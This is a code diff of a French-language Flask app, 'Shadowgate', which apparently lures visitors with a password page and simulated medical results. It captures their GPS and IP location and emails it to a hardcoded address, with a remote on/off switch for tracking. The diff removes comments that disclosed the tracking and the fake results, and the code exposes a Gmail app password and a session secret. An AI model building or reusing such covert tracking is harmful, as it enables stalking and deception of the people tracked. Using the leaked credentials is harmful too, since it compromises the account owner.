@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, session
 from datetime import datetime
 import smtplib
 import requests
@@ -6,6 +6,7 @@ from email.mime.text import MIMEText
 import json
 
 app = Flask(__name__)
+app.secret_key = "shadowgate2025"  # Ne jamais partager en production
 
 FROM_EMAIL = "mzo.fpa@gmail.com"
 APP_PASSWORD = "jevt qvas vrpj bveo"
@@ -19,7 +20,6 @@ PASSWORD_ACTIONS = {
     "Ther@pi5": "⚫ Situation critique, intervention immédiate requise"
 }
 
-# 📩 Envoi de mail
 def send_email(subject, body):
     msg = MIMEText(body)
     msg["Subject"] = subject
@@ -33,7 +33,6 @@ def send_email(subject, body):
     except Exception as e:
         print(f"[EMAIL ERROR] {e}")
 
-# 📍 Fonction de localisation
 def get_location_info(request, lat, lon):
     if lat and lon:
         link = f"https://www.google.com/maps?q={lat},{lon}&z=18"
@@ -55,13 +54,11 @@ def get_location_info(request, lat, lon):
         except:
             return f"🌐 Impossible d’obtenir la localisation\nIP : {ip}"
 
-# 🔐 Page de connexion principale
 @app.route("/", methods=["GET", "POST"])
 def index():
     error = None
     lat_form = request.form.get("lat", "")
     lon_form = request.form.get("lon", "")
-    gps_ok = lat_form and lon_form
 
     if request.method == "POST":
         password = request.form.get("password")
@@ -69,6 +66,7 @@ def index():
         if password == "13007":
             location_info = get_location_info(request, lat_form, lon_form)
             send_email("📍 Coordonnées consultées – Code 13007", location_info)
+            session["access_granted"] = True
             return redirect("https://astonishing-enemy-368.notion.site/La-confiance-se-m-rite-le-silence-se-choisit-1c2ad04878e5804599bae5dcca9afaf2")
 
         elif password in PASSWORD_ACTIONS:
@@ -76,6 +74,7 @@ def index():
             location_info = get_location_info(request, lat_form, lon_form)
             message = f"{code_desc}\n\n{location_info}"
             send_email("⚠️ Alerte Shadowgate", message)
+            session["access_granted"] = True
             return redirect("/biotrace")
 
         else:
@@ -83,13 +82,13 @@ def index():
 
     return render_template("index.html", error=error)
 
-# 🧬 Résultats médicaux simulés
 @app.route("/biotrace")
 def biotrace():
+    if not session.get("access_granted"):
+        return redirect("/")
     access_time = datetime.now().strftime("%d/%m/%Y à %H:%M")
     return render_template("biotrace.html", access_time=access_time)
 
-# 📡 Réception de la géoloc instantanée (flash)
 @app.route("/flash", methods=["POST"])
 def flash_position():
     try:
@@ -104,7 +103,6 @@ def flash_position():
         print(f"[FLASH ERROR] {e}")
     return "", 204
 
-# 📴 Contrôle distant du tracking
 @app.route("/track-status")
 def track_status():
     try:
@@ -113,6 +111,5 @@ def track_status():
     except:
         return "off"
 
-# ▶️ Lancer le serveur local si besoin
 if __name__ == "__main__":
     app.run(debug=True)
